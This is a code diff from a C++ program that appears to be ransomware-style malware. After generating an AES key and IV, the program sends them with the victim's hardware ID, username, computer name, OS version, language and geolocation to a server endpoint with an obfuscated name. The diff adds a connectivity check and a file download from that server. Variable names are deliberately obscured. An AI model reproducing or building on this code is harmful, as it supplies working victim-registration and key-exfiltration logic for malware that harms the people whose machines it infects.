@@ -42,6 +42,12 @@ int main(void) {
 	checkFile << CHECK_KEY;
 	checkFile.close();
 	*/
+	Http http(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
+	if (http.checkInternetConnection() != S_OK) {
+		std::cout << "No internet connection\n";
+		return 1;
+	}
+	std::cout << http.downloadFile(L"localhost", L"/server/heavyRain/dlTest.txt", L"Content-Type: application/x-www-form-urlencoded\r\n", L"testDown.txt");
 
 	CryptoPP::AutoSeededRandomPool prng;
 	CryptoPP::SecByteBlock  key(CryptoPP::AES::DEFAULT_KEYLENGTH);
@@ -55,7 +61,6 @@ int main(void) {
 	std::string dbhzgdzdgzm;
 	CryptoPP::StringSource(key.data(), key.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(ddzdzjd)));
 	CryptoPP::StringSource(iv.data(), iv.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(dbhzgdzdgzm)));
-	Http http(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
 	http.SendPostRequest(L"localhost", L"/server/hdhohzuag.php?action=add", L"Content-Type: application/x-www-form-urlencoded\r\n", "uuid=" + sys.getHwId() + "&username=" + sys.getUsername() + "&computername=" + sys.getComputerName() + "&osversion=" + sys.getOsVersion() + "&country=" + data[0] + "&region=" + data[3] + "&city=" + data[1] + "&key=" + ddzdzjd + "&iv=" + dbhzgdzdgzm + "&latlong=" + data[2] + "&langId=" + sys.getLangId());
 	std::string response = http.GetResponseText();	
 
